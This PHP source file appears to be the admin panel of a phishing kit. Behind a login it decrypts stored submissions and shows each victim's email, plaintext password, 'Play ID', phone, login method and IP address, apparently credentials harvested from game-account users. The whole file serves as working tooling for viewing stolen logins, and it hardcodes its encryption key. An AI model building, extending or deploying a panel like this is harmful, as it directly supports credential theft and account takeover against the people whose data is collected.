<?php
$customSessionPath = __DIR__ . '/sessions';
if (!is_dir($customSessionPath)) {
    mkdir($customSessionPath, 0700, true);
    file_put_contents($customSessionPath . '/index.php', "<?php http_response_code(403); exit(); ?>");
}
session_save_path($customSessionPath);

define('ENCRYPTION_KEY', hash('sha512', __DIR__ . php_uname() . phpversion()));
define('ENCRYPTION_METHOD', 'aes-256-gcm');

class EncryptedSessionHandler implements SessionHandlerInterface {
    private $path;
    private $key;
    public function __construct($path, $key) {
        $this->path = $path;
        $this->key = $key;
    }
    public function open($savePath, $sessionName): bool { return true; }
    public function close(): bool { return true; }
    public function read($sessionId): string {
        $file = $this->path . '/sess_' . hash('sha256', $sessionId);
        if (!file_exists($file)) return '';
        $encryptedData = file_get_contents($file);
        if ($encryptedData === false) return '';
        $parts = explode('::', $encryptedData, 3);
        if (count($parts) !== 3) return '';
        list($iv, $tag, $encrypted) = $parts;
        $iv = hex2bin($iv);
        $tag = hex2bin($tag);
        $encrypted = hex2bin($encrypted);
        $data = openssl_decrypt($encrypted, ENCRYPTION_METHOD, $this->key, 0, $iv, $tag);
        return $data === false ? '' : $data;
    }
    public function write($sessionId, $data): bool {
        $file = $this->path . '/sess_' . hash('sha256', $sessionId);
        $iv = random_bytes(openssl_cipher_iv_length(ENCRYPTION_METHOD));
        $encrypted = openssl_encrypt($data, ENCRYPTION_METHOD, $this->key, 0, $iv, $tag);
        if ($encrypted === false) return false;
        $storedData = bin2hex($iv) . '::' . bin2hex($tag) . '::' . bin2hex($encrypted);
        return file_put_contents($file, $storedData, LOCK_EX) !== false;
    }
    public function destroy($sessionId): bool {
        $file = $this->path . '/sess_' . hash('sha256', $sessionId);
        if (file_exists($file)) unlink($file);
        return true;
    }
    public function gc($maxLifetime): int|false {
        foreach (glob($this->path . '/sess_*') as $file) {
            if (filemtime($file) + $maxLifetime < time()) unlink($file);
        }
        return 0;
    }
}

$handler = new EncryptedSessionHandler($customSessionPath, ENCRYPTION_KEY);
session_set_save_handler($handler, true);
session_start([
    'cookie_httponly' => true,
    'cookie_secure' => !empty($_SERVER['HTTPS']),
    'cookie_samesite' => 'Strict',
    'use_strict_mode' => true,
    'use_only_cookies' => true,
    'sid_length' => 64,
    'sid_bits_per_character' => 6
]);

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header('Location: login.php?error=Please login first');
    exit;
}
if ($_SESSION['user_agent'] !== hash('sha256', $_SERVER['HTTP_USER_AGENT']) || $_SESSION['ip_address'] !== hash('sha256', $_SERVER['REMOTE_ADDR'])) {
    session_destroy();
    header('Location: login.php?error=Session validation failed');
    exit;
}

$username = $_SESSION['username'] ?? 'Guest';

define('DATA_KEY', 'd0a7e7997b6d5fcd55f4b5c32611b87cd923e88837b63bf2941ef819dc8ca282');
define('DATA_METHOD', 'AES-256-CBC');

function decryptData($data) {
    $data = base64_decode($data);
    $iv = substr($data, 0, openssl_cipher_iv_length(DATA_METHOD));
    $encrypted = substr($data, openssl_cipher_iv_length(DATA_METHOD));
    return openssl_decrypt($encrypted, DATA_METHOD, DATA_KEY, 0, $iv);
}

$dataFile = 'data.json';
$entries = [];
if (file_exists($dataFile)) {
    $jsonData = file_get_contents($dataFile);
    $encryptedEntries = json_decode($jsonData, true) ?: [];
    foreach ($encryptedEntries as $encryptedEntry) {
        $decryptedData = decryptData($encryptedEntry);
        $entries[] = json_decode($decryptedData, true);
    }
}

$entries = array_reverse($entries);

function getColorFromName($name) {
    $colors = ['#4361ee','#3a0ca3','#7209b7','#f72585','#4cc9f0','#4895ef','#560bad','#b5179e','#3f37c9','#4895ef','#4361ee','#3a0ca3','#7209b7','#f72585','#4cc9f0'];
    if (empty($name)) return $colors[0];
    $hash = crc32($name);
    $index = abs($hash) % count($colors);
    return $colors[$index];
}

$perPage = 10;
$totalEntries = count($entries);
$totalPages = ceil($totalEntries / $perPage);
$currentPage = isset($_GET['page']) ? max(1, min($_GET['page'], $totalPages)) : 1;
$offset = ($currentPage - 1) * $perPage;
$paginatedEntries = array_slice($entries, $offset, $perPage);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>View Data | Admin Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">

    <style>
        /* Updated to modern sophisticated theme with gray-800 primary and purple accents */
        :root {
            --background: #ffffff;
            --foreground: #1f2937;
            --card: #f1f5f9;
            --card-foreground: #1f2937;
            --primary: #1f2937;
            --primary-foreground: #ffffff;
            --secondary: #8b5cf6;
            --secondary-foreground: #ffffff;
            --muted: #6b7280;
            --muted-foreground: #ffffff;
            --accent: #8b5cf6;
            --accent-foreground: #ffffff;
            --destructive: #e53e3e;
            --destructive-foreground: #ffffff;
            --border: #d1d5db;
            --input: #f1f5f9;
            --ring: #8b5cf6;
            --radius: 0.5rem;
            --shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --shadow-lg: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, var(--card) 0%, var(--background) 100%);
            color: var(--foreground);
            line-height: 1.6;
            min-height: 100vh;
        }

        .header {
            background: var(--primary);
            color: var(--primary-foreground);
            padding: 20px 28px;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: var(--shadow);
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border);
        }

        .header h1 {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 24px;
            font-weight: 700;
            letter-spacing: -0.02em;
        }

        .header .user-info {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .header .username {
            font-weight: 600;
            font-size: 16px;
        }

        .logout-btn {
            background: rgba(255, 255, 255, 0.1);
            color: var(--primary-foreground);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 10px 16px;
            border-radius: var(--radius);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }

        .logout-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            color: var(--primary-foreground);
            text-decoration: none;
            transform: translateY(-1px);
        }

        .main-content {
            padding: 32px;
            max-width: 1400px;
            margin: 0 auto;
        }

        .back-btn {
            margin-bottom: 24px;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: var(--radius);
            font-size: 14px;
            font-weight: 600;
            font-family: 'DM Sans', sans-serif;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            position: relative;
            overflow: hidden;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }

        .btn:hover::before {
            left: 100%;
        }

        .btn-primary {
            background: var(--primary);
            color: var(--primary-foreground);
        }

        .btn-primary:hover {
            background: #374151;
            transform: translateY(-2px);
            box-shadow: var(--shadow);
            text-decoration: none;
            color: var(--primary-foreground);
        }

        .card {
            background: var(--background);
            border-radius: var(--radius);
            box-shadow: var(--shadow);
            margin-bottom: 28px;
            overflow: hidden;
            border: 1px solid var(--border);
        }

        .card-header {
            background: var(--primary);
            color: var(--primary-foreground);
            padding: 20px 24px;
            font-family: 'Space Grotesk', sans-serif;
            font-weight: 600;
            font-size: 18px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            letter-spacing: -0.01em;
        }

        .card-header .badge {
            background: rgba(255, 255, 255, 0.2);
            color: var(--primary-foreground);
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            backdrop-filter: blur(10px);
        }

        .card-body {
            padding: 24px;
        }

        .data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 24px;
            padding: 0;
        }

        .data-card {
            background: var(--background);
            border-radius: var(--radius);
            box-shadow: var(--shadow);
            overflow: hidden;
            transition: all 0.3s ease;
            position: relative;
            border: 1px solid var(--border);
        }

        .data-card:hover {
            transform: translateY(-4px);
            box-shadow: var(--shadow-lg);
        }

        .data-card-header {
            padding: 16px 20px;
            color: var(--primary-foreground);
            text-align: center;
            font-weight: 600;
            font-size: 14px;
            font-family: 'Space Grotesk', sans-serif;
            letter-spacing: 0.01em;
        }

        .data-card-body {
            padding: 20px;
        }

        .data-field {
            margin-bottom: 12px;
            display: flex;
            font-size: 13px;
        }

        .data-label {
            font-weight: 600;
            color: var(--muted);
            min-width: 80px;
            flex-shrink: 0;
        }

        .data-value {
            word-break: break-word;
            color: var(--foreground);
            font-weight: 500;
        }

        .data-id {
            font-size: 11px;
            color: var(--muted);
            text-align: right;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid var(--border);
            font-weight: 500;
        }

        .timestamp {
            font-size: 11px;
            color: var(--muted);
            margin-top: 12px;
            padding-top: 12px;
            border-top: 1px solid var(--border);
            font-weight: 500;
        }

        .empty-state {
            grid-column: 1 / -1;
            text-align: center;
            padding: 80px 20px;
            color: var(--muted);
            background: var(--background);
            border-radius: var(--radius);
            box-shadow: var(--shadow);
            border: 1px solid var(--border);
        }

        .empty-state i {
            font-size: 64px;
            margin-bottom: 20px;
            color: var(--border);
        }

        .empty-state h5 {
            font-family: 'Space Grotesk', sans-serif;
            color: var(--foreground);
            margin-bottom: 12px;
            font-size: 20px;
            font-weight: 600;
        }

        .new-badge {
            position: absolute;
            top: -10px;
            right: -10px;
            background: var(--accent);
            color: var(--accent-foreground);
            border-radius: 50%;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
            box-shadow: var(--shadow);
            border: 2px solid var(--background);
        }

        .data-card-wrapper {
            position: relative;
        }

        .pagination {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            margin-top: 40px;
        }

        .page-item {
            list-style: none;
        }

        .page-link {
            padding: 10px 16px;
            border: 2px solid var(--border);
            border-radius: var(--radius);
            color: var(--primary);
            text-decoration: none;
            font-weight: 600;
            font-family: 'DM Sans', sans-serif;
            transition: all 0.3s ease;
            background: var(--background);
        }

        .page-link:hover {
            background: var(--primary);
            color: var(--primary-foreground);
            border-color: var(--primary);
            text-decoration: none;
            transform: translateY(-1px);
        }

        .page-item.active .page-link {
            background: var(--primary);
            color: var(--primary-foreground);
            border-color: var(--primary);
        }

        .page-item.disabled .page-link {
            color: var(--muted);
            cursor: not-allowed;
            background: var(--card);
        }

        .page-item.disabled .page-link:hover {
            background: var(--card);
            color: var(--muted);
            border-color: var(--border);
            transform: none;
        }

        @media (max-width: 768px) {
            .main-content {
                padding: 20px;
            }
            
            .header {
                padding: 16px 20px;
            }
            
            .header h1 {
                font-size: 20px;
            }
            
            .data-grid {
                grid-template-columns: 1fr;
            }
            
            .card-body {
                padding: 20px;
            }
        }
    </style>
</head>
<body>

<!-- Header -->
<div class="header">
    <h1><i class="fas fa-database"></i> Data Management</h1>
    <div class="user-info">
        <span class="username"><?php echo htmlspecialchars($username); ?></span>
        <a href="logout.php" class="logout-btn">
            <i class="fas fa-sign-out-alt"></i> Logout
        </a>
    </div>
</div>

<!-- Main Content -->
<div class="main-content">
    <div class="back-btn">
        <a href="dashboard.php" class="btn btn-primary">
            <i class="fas fa-arrow-left"></i> Back to Dashboard
        </a>
    </div>

    <div class="card">
        <div class="card-header">
            <div>
                <i class="fas fa-database"></i> View Data
            </div>
            <span class="badge"><?php echo $totalEntries; ?> records</span>
        </div>
        <div class="card-body">
            <?php if (empty($entries)): ?>
                <div class="empty-state">
                    <i class="fas fa-database"></i>
                    <h5>No data available</h5>
                    <p>When new data is submitted, it will appear here.</p>
                </div>
            <?php else: ?>
                <div class="data-grid">
                   <?php foreach ($paginatedEntries as $index => $entry): 
                        $isNew = $currentPage == 1 && $index < 3;
                        $headerColor = getColorFromName($entry['sender'] ?? '');
                    ?>
                        <div class="data-card-wrapper">
                            <?php if ($isNew): ?>
                                <div class="new-badge" title="New Entry">!</div>
                            <?php endif; ?>
                            <div class="data-card">
                                <div class="data-card-header" style="background: <?php echo $headerColor; ?>">
                                    <?php echo htmlspecialchars($entry['sender'] ?? 'N/A'); ?>
                                </div>
                                <div class="data-card-body">
                                    <div class="data-field">
                                        <span class="data-label">Email:</span>
                                        <span class="data-value"><?php echo htmlspecialchars($entry['email'] ?? 'N/A'); ?></span>
                                    </div>
                                    <div class="data-field">
                                        <span class="data-label">Password:</span>
                                        <span class="data-value"><?php echo htmlspecialchars($entry['password'] ?? 'N/A'); ?></span>
                                    </div>
                                    <div class="data-field">
                                        <span class="data-label">Play ID:</span>
                                        <span class="data-value"><?php echo htmlspecialchars($entry['playid'] ?? 'N/A'); ?></span>
                                    </div>
                                    <div class="data-field">
                                        <span class="data-label">Phone:</span>
                                        <span class="data-value"><?php echo htmlspecialchars($entry['phone'] ?? 'N/A'); ?></span>
                                    </div>
                                    <div class="data-field">
                                        <span class="data-label">Level:</span>
                                        <span class="data-value"><?php echo htmlspecialchars($entry['level'] ?? 'N/A'); ?></span>
                                    </div>
                                    <div class="data-field">
                                        <span class="data-label">Login:</span>
                                        <span class="data-value"><?php echo htmlspecialchars($entry['login'] ?? 'N/A'); ?></span>
                                    </div>
                                    <div class="data-field">
                                        <span class="data-label">IP:</span>
                                        <span class="data-value"><?php echo htmlspecialchars($entry['ip_address'] ?? 'N/A'); ?></span>
                                    </div>
                                    <div class="timestamp">
                                        <?php echo htmlspecialchars($entry['timestamp'] ?? 'N/A'); ?>
                                    </div>
                                    <div class="data-id">ID: <?php echo htmlspecialchars($entry['id'] ?? 'N/A'); ?></div>
                                </div>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>

                <!-- Pagination -->
                <?php if ($totalPages > 1): ?>
                <nav aria-label="Page navigation">
                    <ul class="pagination">
                        <?php if ($currentPage > 1): ?>
                            <li class="page-item">
                                <a class="page-link" href="?page=<?php echo $currentPage - 1; ?>" aria-label="Previous">
                                    <span aria-hidden="true">&laquo;</span>
                                </a>
                            </li>
                        <?php endif; ?>

                        <?php 
                        $startPage = max(1, $currentPage - 2);
                        $endPage = min($totalPages, $currentPage + 2);
                        
                        if ($startPage > 1) {
                            echo '<li class="page-item"><a class="page-link" href="?page=1">1</a></li>';
                            if ($startPage > 2) {
                                echo '<li class="page-item disabled"><span class="page-link">...</span></li>';
                            }
                        }
                        
                        for ($i = $startPage; $i <= $endPage; $i++) {
                            $active = ($i == $currentPage) ? 'active' : '';
                            echo '<li class="page-item '.$active.'"><a class="page-link" href="?page='.$i.'">'.$i.'</a></li>';
                        }
                        
                        if ($endPage < $totalPages) {
                            if ($endPage < $totalPages - 1) {
                                echo '<li class="page-item disabled"><span class="page-link">...</span></li>';
                            }
                            echo '<li class="page-item"><a class="page-link" href="?page='.$totalPages.'">'.$totalPages.'</a></li>';
                        }
                        ?>

                        <?php if ($currentPage < $totalPages): ?>
                            <li class="page-item">
                                <a class="page-link" href="?page=<?php echo $currentPage + 1; ?>" aria-label="Next">
                                    <span aria-hidden="true">&raquo;</span>
                                </a>
                            </li>
                        <?php endif; ?>
                    </ul>
                </nav>
                <?php endif; ?>
            <?php endif; ?>
        </div>
    </div>
</div>

</body>
</html>
